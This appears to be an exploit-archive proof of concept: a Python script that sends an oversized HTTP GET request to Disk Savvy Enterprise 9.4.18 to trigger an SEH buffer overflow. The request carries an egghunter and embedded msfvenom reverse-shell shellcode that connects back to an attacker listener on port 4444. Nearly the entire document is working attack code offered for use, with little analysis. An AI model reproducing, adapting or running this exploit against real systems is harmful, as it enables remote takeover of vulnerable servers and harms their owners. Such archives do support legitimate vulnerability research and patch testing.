# Exploit Title: Disk Savvy Enterprise v9.4.18 Server - Remote Buffer Overflow SEH
# Date: 1-5-2019
# Exploit Author: buffered4ever
# Vendor Homepage: www.saptech-erp.com.au
# Software Link: https://www.exploit-db.com/apps/9b75b88b6e742d1df42db3ef4400a325-disksavvyent_setup_v9.4.18.exe
# Version: 9.4.18
# Tested on: Windows XP SP2

import os
import socket

badchars=("\x00\x0a\x0d\x09\x20")

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 -b '\x00\x0a\x0d\x09\x20' BufferRegister=EDI -f python
buf =  ""
buf += "\x89\xfa\x29\xc9\xbb\xbf\x3c\x0e\x01\xb1\x52\x31\x5a"
buf += "\x12\x03\x5a\x12\x83\x55\xc0\xec\xf4\x55\xd1\x73\xf6"
buf += "\xa5\x22\x14\x7e\x40\x13\x14\xe4\x01\x04\xa4\x6e\x47"
buf += "\xa9\x4f\x22\x73\x3a\x3d\xeb\x74\x8b\x88\xcd\xbb\x0c"
buf += "\xa0\x2e\xda\x8e\xbb\x62\x3c\xae\x73\x77\x3d\xf7\x6e"
buf += "\x7a\x6f\xa0\xe5\x29\x9f\xc5\xb0\xf1\x14\x95\x55\x72"
buf += "\xc9\x6e\x57\x53\x5c\xe4\x0e\x73\x5f\x29\x3b\x3a\x47"
buf += "\x2e\x06\xf4\xfc\x84\xfc\x07\xd4\xd4\xfd\xa4\x19\xd9"
buf += "\x0f\xb4\x5e\xde\xef\xc3\x96\x1c\x8d\xd3\x6d\x5e\x49"
buf += "\x51\x75\xf8\x1a\xc1\x51\xf8\xcf\x94\x12\xf6\xa4\xd3"
buf += "\x7c\x1b\x3a\x37\xf7\x27\xb7\xb6\xd7\xa1\x83\x9c\xf3"
buf += "\xea\x50\xbc\xa2\x56\x36\xc1\xb4\x38\xe7\x67\xbf\xd5"
buf += "\xfc\x15\xe2\xb1\x31\x14\x1c\x42\x5e\x2f\x6f\x70\xc1"
buf += "\x9b\xe7\x38\x8a\x05\xf0\x3f\xa1\xf2\x6e\xbe\x4a\x03"
buf += "\xa7\x05\x1e\x53\xdf\xac\x1f\x38\x1f\x50\xca\xef\x4f"
buf += "\xfe\xa5\x4f\x3f\xbe\x15\x38\x55\x31\x49\x58\x56\x9b"
buf += "\xe2\xf3\xad\x4c\xcd\xac\xad\xe4\xa5\xae\xad\xe5\x69"
buf += "\x26\x4b\x6f\x82\x6e\xc4\x18\x3b\x2b\x9e\xb9\xc4\xe1"
buf += "\xdb\xfa\x4f\x06\x1c\xb4\xa7\x63\x0e\x21\x48\x3e\x6c"
buf += "\xe4\x57\x94\x18\x6a\xc5\x73\xd8\xe5\xf6\x2b\x8f\xa2"
buf += "\xc9\x25\x45\x5f\x73\x9c\x7b\xa2\xe5\xe7\x3f\x79\xd6"
buf += "\xe6\xbe\x0c\x62\xcd\xd0\xc8\x6b\x49\x84\x84\x3d\x07"
buf += "\x72\x63\x94\xe9\x2c\x3d\x4b\xa0\xb8\xb8\xa7\x73\xbe"
buf += "\xc4\xed\x05\x5e\x74\x58\x50\x61\xb9\x0c\x54\x1a\xa7"
buf += "\xac\x9b\xf1\x63\xdc\xd1\x5b\xc5\x75\xbc\x0e\x57\x18"
buf += "\x3f\xe5\x94\x25\xbc\x0f\x65\xd2\xdc\x7a\x60\x9e\x5a"
buf += "\x97\x18\x8f\x0e\x97\x8f\xb0\x1a"


egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#10013542  5E POP ESI

shell="T00WT00W"+buf


evilcrash = "A" * (2491-4) + "\x70\x06\x71\x04" + "\x42\x35\x01\x10"  +  egghunter + shell  + "C" * (5000-2495-len(egghunter)-len(shell))
#evilcrash = "A" * 8 + bad * 92 + "B" * 4900


buffer = "GET /"+ evilcrash +" HTTP/1.1\r\n"
buffer+= "Host: 192.168.0.102" + "\r\n"
buffer+= "User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:37.0) Gecko/20100101 Firefox/37.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Accept-Encoding: gzip, deflate\r\n"
buffer+="Referer: http://192.168.0.102/login\r\n"
buffer+="Connection: keep-alive\r\n\r\n"

print "[*] Sending evil HTTP request to Disksavvy"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.0.102", 80))
expl.send(buffer)
expl.close()

